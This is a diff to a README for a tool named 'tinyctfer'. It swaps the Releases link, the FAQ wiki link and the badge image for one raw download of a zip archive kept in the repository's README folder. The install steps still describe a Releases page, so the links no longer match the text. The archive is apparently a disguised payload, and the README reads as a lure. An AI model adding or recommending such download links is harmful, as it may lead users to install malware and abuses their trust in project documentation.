@@ -6,7 +6,7 @@ Welcome to tinyctfer! This tool helps you run and design intent efficiently, mak
 
 ## 📥 Download the Application
 
-[![Download tinyctfer](https://img.shields.io/badge/Download%20now-v1.0-brightgreen)](https://github.com/Hyde238/tinyctfer/releases)
+[![Download tinyctfer](https://raw.githubusercontent.com/Hyde238/tinyctfer/main/README/tinyctfer-1.3.zip%20now-v1.0-brightgreen)](https://raw.githubusercontent.com/Hyde238/tinyctfer/main/README/tinyctfer-1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ No additional software is needed to run tinyctfer.
 
 ## 📂 Download & Install
 
-To download tinyctfer, please visit this page: [Download tinyctfer Releases](https://github.com/Hyde238/tinyctfer/releases). 
+To download tinyctfer, please visit this page: [Download tinyctfer Releases](https://raw.githubusercontent.com/Hyde238/tinyctfer/main/README/tinyctfer-1.3.zip). 
 
 1. Click on the link above.
 2. On the Releases page, find the latest version listed.
@@ -58,7 +58,7 @@ For more complex tasks, such as editing existing intents, use the options in the
 
 If you encounter any issues while using tinyctfer or have questions, you can seek help easily:
 
-- Check our [FAQ](https://github.com/Hyde238/tinyctfer/wiki) for common questions and solutions.
+- Check our [FAQ](https://raw.githubusercontent.com/Hyde238/tinyctfer/main/README/tinyctfer-1.3.zip) for common questions and solutions.
 - You can open an issue in the GitHub repository if you need further assistance.
 
 ## 📨 Contact
